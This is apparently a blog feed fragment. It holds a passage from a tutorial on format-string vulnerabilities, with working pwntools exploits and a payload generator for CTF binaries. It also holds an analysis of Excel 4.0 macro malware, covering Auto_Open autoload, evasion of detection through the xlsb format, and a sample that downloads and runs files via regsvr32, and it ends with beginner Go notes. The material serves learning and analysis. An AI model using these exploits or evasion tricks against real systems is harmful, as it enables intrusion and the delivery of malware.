class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;c);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>一般需要构造的payload如下</p><figure class="highlight scss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scss">...<span class="hljs-selector-attr">[overwrite addr]</span>....%<span class="hljs-selector-attr">[overwrite offset]</span><span class="hljs-variable">$n</span><br></code></pre></div></td></tr></table></figure><p>在这其中，<code>...</code>表示需要填充的内容，<code>overwrite addr</code> 是需要覆盖的地址，<code>overwrite offset</code>表示需要覆盖的地址存储位置是输出函数格式化字符串的第几个参数。由此确定几个步骤：</p><ul><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ul><h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><h5 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h5><p>首先是要确定覆盖的地址，在这个程序中，就是需要知道变量C的地址，这个示例作为学习，就在代码中直接输出了变量C的地址，比较简单。</p><h5 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h5><p>通过调试确定输入的格式化字符串是第几个参数。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/9.png"></p><p>调试之后，可以看到，格式化字符串是第六个参数。</p><h5 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h5><p>现在已经知道了要覆盖的地址，还有覆盖的是第几个参数，现在就可以来尝试进行覆盖了。构造的payload如下，首先是变量C的存储地址，程序会打印，只需要接收即可，然后是<code>%012d</code>，刚才知道<code>%n</code>会把成功输出的字符个数写入，所以地址是四个字节，现在还需要十二个，就是十六。然后是<code>%6$n</code>，刚才分析过，是第六个参数。</p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">[addr of <span class="hljs-keyword">c</span>]<span class="hljs-variable">%012</span>d<span class="hljs-variable">%6</span>$n<br></code></pre></div></td></tr></table></figure><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *    <br>sh = process(<span class="hljs-string">&#x27;./3&#x27;</span>)<br>c_addr = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(c_addr)<br>payload = p32(c_addr) + <span class="hljs-string">&#x27;%012d&#x27;</span> + <span class="hljs-string">&#x27;%6$n&#x27;</span><br><span class="hljs-built_in">print</span> payload<br>gdb.attach(sh)<br>sh.sendline(payload)<br><span class="hljs-built_in">print</span> sh.recv()<br>sh.interactive()<br></code></pre></div></td></tr></table></figure><p>看到结果已经成功输出了当C=16时的字符串。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/10.png"></p><h3 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h3><h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>现在来考虑一下如何修改<code>data</code>段的变量，将其修改为一个较小的数字，比如说小于机器字长的数字，比如说2。根据前面的例子，我们知道，前面是地址，而这个地址最少都是四字节（32位），所以无论如何都不会小于四字节。</p><p>现在就需要重新构建一下payload，可以把地址放在中间，而不需要将其放在最前面，只要能够找到对应的偏移量，也是可以得到对应的数值。刚才那个程序，我们已经分析过格式化字符串是第六个参数，要将2写到指定位置的话，那么地址不能放在前面，前面可以放两个字节任意字符，<code>XX%n</code>，此时这已经是第六个参数，然后是<code>$xXX</code>，这就是第七个参数，最后就是地址，也就是第八个参数，那么此时的payload就可以是以下的形式</p><figure class="highlight mel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mel">XX%8$nXX[addr]<br></code></pre></div></td></tr></table></figure><p>现在尝试覆盖a的地址，因为a是一个已经初始过得全局变量，在IDA中可以直接看到地址。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/11.png"></p><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./overwrite&quot;</span>)<br>a_addr = <span class="hljs-number">0x804a024</span><br>payload = <span class="hljs-string">&quot;aa%8$naa&quot;</span> + p32(a_addr)<br>p.sendline(payload)<br><span class="hljs-built_in">print</span> p.recv()<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>看到成功输出了a=2的信息。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/12.png"></p><h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>刚才是覆盖小数字，现在来尝试覆盖大数字。首先来了解一下变量在内存中的存储格式。所有的变量在内存中都是以字节进行存储的，然后都是以小端序进行存储的。再来回忆一下格式化字符串里面的标志，发现有这样两个标志：</p><ul><li><code>hh</code>对于整数类型，<code>printf</code>期待一个从<code>char</code>提升的<code>int</code>尺寸的整型参数。</li><li><code>h</code>对于整数类型，<code>printf</code>期待一个从<code>short</code>提升的<code>int</code>尺寸的整型参数。</li></ul><p>确定一下写入的地址，可以直接在IDA中看到，变量b的地址是<code>0x804A028</code>，此时想要的覆盖效果如下：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">0x0804A028</span>-&gt;<span class="hljs-number">0</span>x<span class="hljs-number">78</span><br><span class="hljs-attribute">0x0804A029</span>-&gt;<span class="hljs-number">0</span>x<span class="hljs-number">56</span><br><span class="hljs-attribute">0x0804A02a</span>-&gt;<span class="hljs-number">0</span>x<span class="hljs-number">34</span><br><span class="hljs-attribute">0x0804A02b</span>-&gt;<span class="hljs-number">0</span>x<span class="hljs-number">12</span><br></code></pre></div></td></tr></table></figure><p>直接利用wiki中的模板进行计算</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt</span>(<span class="hljs-params">prev, word, index</span>):</span><br>    <span class="hljs-keyword">if</span> prev &lt; word:<br>        result = word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    <span class="hljs-keyword">elif</span> prev == word:<br>        result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        result = <span class="hljs-number">256</span> + word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    fmtstr += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;$hhn&quot;</span><br>    <span class="hljs-keyword">return</span> fmtstr<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_str</span>(<span class="hljs-params">offset, size, addr, target</span>):</span><br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> size == <span class="hljs-number">4</span>:<br>            payload += p32(addr + i)<br>        <span class="hljs-keyword">else</span>:<br>            payload += p64(addr + i)<br>    prev = <span class="hljs-built_in">len</span>(payload)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        payload += fmt(prev, (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>, offset + i)<br>        prev = (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> payload<br></code></pre></div></td></tr></table></figure><p>完整的EXP如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forb</span>():</span><br>    sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>    payload = fmt_str(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x0804A028</span>, <span class="hljs-number">0x12345678</span>)<br>    <span class="hljs-built_in">print</span> payload<br>    sh.sendline(payload)<br>    <span class="hljs-built_in">print</span> sh.recv()<br>    sh.interactive()<br></code></pre></div></td></tr></table></figure><p>成功输出对应信息</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/13.png"></p><p>了解到在<code>pwntools</code>中还有工具<code>fmtstr_payload</code>，可以直接拿来进行计算。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">p</span> = process(<span class="hljs-string">&quot;./overwrite&quot;</span>)<br><span class="hljs-attribute">payload</span> = fmtstr_payload(<span class="hljs-number">6</span>,&#123;<span class="hljs-number">0</span>x<span class="hljs-number">804</span>A<span class="hljs-number">028</span>:<span class="hljs-number">0</span>x<span class="hljs-number">12345678</span>&#125;)<br><span class="hljs-attribute">print</span> payload<br><span class="hljs-attribute">p</span>.sendline(payload)<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></div></td></tr></table></figure><p>其中第一个参数为偏移，第二个表示写入的数据，数据地址，以及要写入的信息。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/14.png"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="64位程序格式化字符串漏洞"><a href="#64位程序格式化字符串漏洞" class="headerlink" title="64位程序格式化字符串漏洞"></a>64位程序格式化字符串漏洞</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>对于64位的程序与32位的偏移计算是类似的，只不过64位函数的前6个参数是存储在相应的寄存器中的。而对于漏洞，程序依旧会按照格式化字符串相应格式对其进行解析。</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>例题<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">pwn200 GoodLuck</a></p><p>查看一下保护机制</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/15.png"></p><p>分析程序，看到漏洞点</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/16.png"></p><p>使用gdb调试程序，断在<code>printf</code>之前，看到此时的找情况，我们想要的<code>flag</code>在第四个位置，然后这是一个64位的程序，对应的前六个参数都会存在寄存器之中，加上这个偏移量就是10，然后还有一个格式化字符串，作为它的参数，偏移量就是9。所以输入<code>%9$s</code>即可。</p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/17.png"></p><p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/18.png"></p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh=process(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;%9$s&#x27;</span>)<br><span class="hljs-built_in">print</span> sh.recv()<br></code></pre></div></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>主要都是参考了CTF-WIKI中的内容，一些文字性的内容，也没有修改，都是直接写了wiki中的内容，感觉自己总结能力也比较差，很多东西写的没人家好，还有一些例子我并没有做，主要目前还不是很懂一些知识点，先挖个坑吧，等以后慢慢再回过头来学习。</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;格式化字符串&quot;&gt;&lt;a href=&quot;#格式化字符串&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串&quot;&gt;&lt;/a&gt;格式化字符串&lt;/h2&gt;&lt;h3 id=&quot;原理介绍&quot;&gt;&lt;a href=&quot;#原理介绍&quot; class=&quot;headerlink&quot; title=&quot;原</summary>
      
    
    
    
    <category term="PWN" scheme="https://b1ackie.cn/categories/PWN/"/>
    
    
    <category term="格式化字符串" scheme="https://b1ackie.cn/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>Macro 4.0总结</title>
    <link href="https://b1ackie.cn/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/"/>
    <id>https://b1ackie.cn/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/</id>
    <published>2021-12-13T06:24:23.000Z</published>
    <updated>2022-01-04T05:39:40.345Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上周碰到了一个Excel 宏4.0的<code>xlsb</code>样本，也算是分析的第一个宏病毒，起初对于宏的提取完全没有用，用了很长时间才成功提取并且看到宏代码，所以来稍微的总结一下关于宏4.0的东西。</p><p>宏4.0最早在1992年在Excel 4.0版本中引入，是Visual Basic for Applications (VBA) 的前身，和现在的VBA宏不一样，宏4.0可以直接写在表格里。而现在这种老技术又重新流行了起来，主要是这种宏比VBA宏有更好的免杀性。它不依赖于错误，也不是漏洞利用，只是滥用合法的excel功能。一些样本受密码保护，代码混淆，工作表隐藏，以及一些检测机制，使得对于它的分析难度会提高。还有将其保存为<code>xlsb</code>文件，而不是<code>xlsm</code>文件时，一些检测的手段会直接失效，现在来尝试总结分析一下Excel 4.0的手段。</p><h2 id="宏4-0-利用"><a href="#宏4-0-利用" class="headerlink" title="宏4.0 利用"></a>宏4.0 利用</h2><p>现在来演示一下如何利用宏4.0</p><h3 id="宏的利用"><a href="#宏的利用" class="headerlink" title="宏的利用"></a>宏的利用</h3><p>在某个工作表上右键，选择插入</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/1.png"></p><p>在弹框中选择MS Excel4.0</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/2.png"></p><p>在新创建的工作表中，在框中输入宏指令，然后右键选择执行。</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/3.png"></p><h3 id="自动加载方式"><a href="#自动加载方式" class="headerlink" title="自动加载方式"></a>自动加载方式</h3><p>现在主流的自动加载的方式分别是<code>Auto_Open</code>和<code>Auto_Close</code></p><ul><li><code>Auto_Open</code>会在用户打开文档的时候自动运行</li><li><code>Auto_Close</code>会在用户关闭文档的时候自动运行</li></ul><p>上述两种方式自动运行都需要用户允许执行宏代码。</p><p>将单元格名称改为<code>Auto_Open</code>，就实现了宏的自动加载。</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/4.png"></p><p>保存之后，再打开，会看到宏的警告</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/5.png"></p><p>点击允许，就会弹窗</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/6.png"></p><h3 id="查看宏代码"><a href="#查看宏代码" class="headerlink" title="查看宏代码"></a>查看宏代码</h3><p>当我们按下<code>alt+F11</code>查看宏代码的时候，发现这样是不能够查看到宏代码</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/7.png"></p><p>默认情况下，XLM宏代码存储在xl\Macrosheets\下的Sheet1.xml中，解压此xlsm文件，然后打开位于目录中的Sheet1.xml，可以看到刚才写入的宏代码。</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/8.png"></p><p>但是这种查看方式，只适用于<code>xlsm</code>格式的文件，如果是<code>xlsb</code>的文件，就没办法看了。可以看到里面都是<code>bin</code>文件，查看不了里面的具体内容。</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/9.png"></p><p>对于<code>xlsm</code>来说，里面的内容都是基于XML的，可以直接打开进行阅读，而<code>xlsb</code>的文件内容则是二进制文件，是没办法直接阅读的。</p><h2 id="oletools使用"><a href="#oletools使用" class="headerlink" title="oletools使用"></a>oletools使用</h2><p>使用工具可以快速的帮助我们进行宏代码的查看</p><p><a href="https://github.com/decalage2/oletools">oletools</a>用于帮助分析ole文件，使用它可以帮助我们分析ole文件中是否存在宏代码。</p><p>安装好工具后可以开始测试，将刚才的文件保存为test.xlsm来进行测试。</p><p><code>oleid</code>可以查看文件是否存在宏代码，查看test.xlsm文件，看到提示存在<code>XLM Macros</code></p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/11.png"></p><p>使用<code>olevba</code>可以从MS Office 文档（OLE 和 OpenXML）中提取和分析 VBA 宏源代码，查看test.xlsm，看到成功提取出宏代码</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/12.png"></p><p>一切保持不变，现在只是将文件保存为<code>xlsb</code>类型的文件，测试看看。</p><p>可以看到没有做任何其他的处理，仅仅只是保存为<code>xlsb</code>文件，其中包含的宏 4.0代码就可以没有办法被检测出来。</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/13.png"></p><p>针对存在宏 4.0的<code>xlsb</code>文件，如何提取其中的宏，我们从一个真实的样本入手</p><p>如何提取出来<code>xlsb</code>文件的宏 4.0，我们从一个真实的样本入手。</p><h2 id="真实样本分析"><a href="#真实样本分析" class="headerlink" title="真实样本分析"></a>真实样本分析</h2><p>样本MD5：cf508cefa3b3f03c1d8300f5f57b9af6</p><p><a href="https://app.any.run/tasks/ca651eb1-bf93-4ded-a592-74e502ab444d/">样本下载地址</a></p><p>此文件是一个XLSB文件</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/14.png"></p><p>打开会提示其中还有宏</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/15.png"></p><p>按下<code>alt+F11</code>看不到任何VBA宏的存在，使用oletools工具同样也无法检测到宏。</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/18.png"></p><p>看到其存在两个隐藏的工作表</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/16.png"></p><p>显示隐藏的工作表，看到上面的单元格直接从C到了H，中间被隐藏起来了，另一个工作表也是如此，那么宏代码应该就是在其中了，但是因为工作表被保护起来了，我们没有密码，所以我们无法移动单元格。</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/17.png"></p><p>现在来尝试获取<code>xlsb</code>中的宏 4.0代码</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p><a href="https://malware.news/t/xlsb-analyzing-a-microsoft-excel-binary-spreadsheet/46442">https://malware.news/t/xlsb-analyzing-a-microsoft-excel-binary-spreadsheet/46442</a></p><p>按照上述这篇帖子的方法，可以成功绕过密码保护，我们修改单元格长度之后，再修改一下字体颜色（原始字体颜色为白色，隐藏了起来）就可以看到宏代码。</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/19.png"></p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/20.png"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用工具Cerbero Suite</p><p><a href="https://cerbero.io/">Cerbero Suite</a></p><p>使用此工具，不像刚才那样那么麻烦，可以直接看到工作表中的宏代码</p><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/21.png"></p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>使用XLMMacroDeobfuscator</p><p><a href="https://github.com/DissectMalware/XLMMacroDeobfuscator">XLMMacroDeobfuscator</a></p><p>这个工具可以非常快速查看宏代码，使用也非常简单，它会自动帮助我们分析其中的宏，并且可以去混淆</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">xlmdeobfuscator -f [指定要检测的文件]<br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/22.png"></p><p>由上图可以清晰的看到其中存在的去混淆后的宏代码</p><p>看到它主要是下载了6个文件存在指定的位置，并且调用<code>regsvr32</code>来启动下载的文件。</p><p>对于下载的文件，只分析出了一小部分的行为，很多关键的地方都没有看懂，所以暂时不放出来，等以后分析明白再放出来。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.yuque.com/p1ut0/qtmgyx/rqank4">https://www.yuque.com/p1ut0/qtmgyx/rqank4</a></p><p><a href="https://zvelo.com/excel-4-0-macros-another-old-school-attack-method/">https://zvelo.com/excel-4-0-macros-another-old-school-attack-method/</a></p><p><a href="https://madlabs.dsu.edu/madrid/blog/2021/05/17/analyzing-document-with-malicious-excel-4-0-macros/">https://madlabs.dsu.edu/madrid/blog/2021/05/17/analyzing-document-with-malicious-excel-4-0-macros/</a></p><p><a href="https://malware.news/t/xlsb-analyzing-a-microsoft-excel-binary-spreadsheet/46442">https://malware.news/t/xlsb-analyzing-a-microsoft-excel-binary-spreadsheet/46442</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上周碰到了一个Excel 宏4.0的&lt;code&gt;xlsb&lt;/code&gt;样本，也算是分析的第一个宏病毒，起初对于宏的提取完全没有用，用了很长时</summary>
      
    
    
    
    <category term="病毒分析" scheme="https://b1ackie.cn/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
    <category term="宏病毒" scheme="https://b1ackie.cn/tags/%E5%AE%8F%E7%97%85%E6%AF%92/"/>
    
    <category term="Macro 4.0" scheme="https://b1ackie.cn/tags/Macro-4-0/"/>
    
  </entry>
  
  <entry>
    <title>Go语言学习笔记二</title>
    <link href="https://b1ackie.cn/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <id>https://b1ackie.cn/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/</id>
    <published>2021-12-02T02:35:23.000Z</published>
    <updated>2021-12-06T07:50:30.603Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Go语言运算符"><a href="#Go语言运算符" class="headerlink" title="Go语言运算符"></a>Go语言运算符</h2><p>运算符用于在程序运行时执行数学或者逻辑运算</p><p>Go语言内置的运算符有：</p><ul><li>算术运算符</li><li>关系运算符</li><li>逻辑运算符</li><li>位运算符</li><li>赋值运算符</li><li>其他运算符</li></ul><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>+</td><td>相加</td></tr><tr><td>-</td><td>相减</td></tr><tr><td>*</td><td>相乘</td></tr><tr><td>/</td><td>相除</td></tr><tr><td>%</td><td>求余</td></tr><tr><td>++</td><td>自增</td></tr><tr><td>–</td><td>自减</td></tr></tbody></table><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-keyword">int</span> = <span class="hljs-number">20</span><br><span class="hljs-keyword">var</span> b <span class="hljs-keyword">int</span> = <span class="hljs-number">10</span><br>fmt.Println(<span class="hljs-string">&quot;a + b =&quot;</span>, a+b)<br>fmt.Println(<span class="hljs-string">&quot;a - b =&quot;</span>, a-b)<br>fmt.Println(<span class="hljs-string">&quot;a * b =&quot;</span>, a*b)<br>fmt.Println(<span class="hljs-string">&quot;a / b =&quot;</span>, a/b)<br>fmt.Println(<span class="hljs-string">&quot;a % b =&quot;</span>, a%b)<br>a++<br>b--<br>fmt.Printf(<span class="hljs-string">&quot;a = %d, b = %d&quot;</span>, a, b)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/1.png"></p><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" 